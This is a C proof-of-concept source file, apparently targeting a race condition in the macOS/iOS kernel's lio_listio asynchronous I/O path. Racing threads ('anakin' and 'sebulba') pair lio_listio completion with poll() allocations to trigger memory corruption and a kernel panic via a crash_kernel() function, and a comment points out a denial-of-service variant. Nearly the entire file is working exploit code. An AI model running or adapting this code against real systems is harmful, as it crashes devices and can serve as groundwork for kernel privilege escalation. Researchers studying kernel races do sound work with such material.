#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <aio.h>
#include <sys/errno.h>
#include <pthread.h>
#include <poll.h>

/* might have to play with those a bit */
#if MACOS_BUILD
#define NB_LIO_LISTIO 1
#define NB_RACER 5
#else
#define NB_LIO_LISTIO 1
#define NB_RACER 30
#endif

#define NENT 1

void *anakin(void *a)
{
	printf("Now THIS is podracing!\n");

    uint64_t err;

    int mode = LIO_NOWAIT;
    int nent = NENT;
    char buf[NENT];
    void *sigp = NULL;

    struct aiocb** aio_list = NULL;
    struct aiocb*  aios = NULL;

    char path[1024] = {0};
#if MACOS_BUILD
    snprintf(path, sizeof(path), "/tmp/lightspeed");
#else
    snprintf(path, sizeof(path), "%slightspeed", getenv("TMPDIR"));
#endif
    
    int fd = open(path, O_RDWR|O_CREAT, S_IRWXU|S_IRWXG|S_IRWXO);
    if (fd < 0)
    {	
    	perror("open");
    	goto exit;
    }

    /* prepare real aio */    
    aio_list = malloc(nent * sizeof(*aio_list));
    if (aio_list == NULL)
    {
    	perror("malloc");
    	goto exit;
    }

    aios = malloc(nent * sizeof(*aios));
    if (aios == NULL)
    {
    	perror("malloc");
        goto exit;
    }

    memset(aios, 0, nent * sizeof(*aios));
    for(uint32_t i = 0; i < nent; i++)
    {
        struct aiocb* aio = &aios[i];

        aio->aio_fildes = fd;
        aio->aio_offset = 0;
        aio->aio_buf = &buf[i];
        aio->aio_nbytes = 1;
        aio->aio_lio_opcode = LIO_READ; // change that to LIO_NOP for a DoS :D
        aio->aio_sigevent.sigev_notify = SIGEV_NONE;

        aio_list[i] = aio;
    }

    while(1)
    {
        err = lio_listio(mode, aio_list, nent, sigp);

        for(uint32_t i = 0; i < nent; i++)
        {
            /* check the return err of the aio to fully consume it */
            while(aio_error(aio_list[i]) == EINPROGRESS) {
            	usleep(100);
            }
            err = aio_return(aio_list[i]);
        }
    }

exit:
    if(fd >= 0)
        close(fd);

    if(aio_list != NULL)
        free(aio_list);

    if(aios != NULL)
        free(aios);

    return NULL;
}

void *sebulba()
{
	printf("You're Bantha poodoo!\n");
	while(1)
	{
		/* not mandatory but used to make the race more likely */
		/* this poll() will force a kalloc16 of a struct poll_continue_args */
		/* with its second dword as 0 (to collide with lio_context->io_issued == 0) */
		/* this technique is quite slow (1ms waiting time) and better ways to do so exists */
	    int n = poll(NULL, 0, 1);
	    if(n != 0)
	    {
	    	/* when the race plays perfectly we might detect it before the crash */
	    	/* most of the time though, we will just panic without going here */
	        printf("poll: %x - kernel crash incomming!\n",n);
	    }
	}

	return 0;
}

void crash_kernel()
{
    pthread_t *lio_listio_threads = malloc(NB_LIO_LISTIO * sizeof(*lio_listio_threads));
    if (lio_listio_threads == NULL)
    {
    	perror("malloc");
    	goto exit;
    }

    pthread_t *racers_threads = malloc(NB_RACER  * sizeof(*racers_threads));
    if (racers_threads == NULL)
    {
    	perror("malloc");
    	goto exit;
    }

    memset(racers_threads, 0, NB_RACER * sizeof(*racers_threads));
    memset(lio_listio_threads, 0, NB_LIO_LISTIO * sizeof(*lio_listio_threads));

    for(uint32_t i = 0; i < NB_RACER; i++)
    {
        pthread_create(&racers_threads[i], NULL, sebulba, NULL);
    }
    for(uint32_t i = 0; i < NB_LIO_LISTIO; i++)
    {   
        pthread_create(&lio_listio_threads[i], NULL, anakin, NULL);
    }

    for(uint32_t i = 0; i < NB_RACER; i++)
    {
        pthread_join(racers_threads[i], NULL);
    }
    for(uint32_t i = 0; i < NB_LIO_LISTIO; i++)
    {
        pthread_join(lio_listio_threads[i], NULL);
    }

exit:
    return;
}

#if MACOS_BUILD
int main(int argc, char* argv[])
{
    crash_kernel();

    return 0;
}
#endif
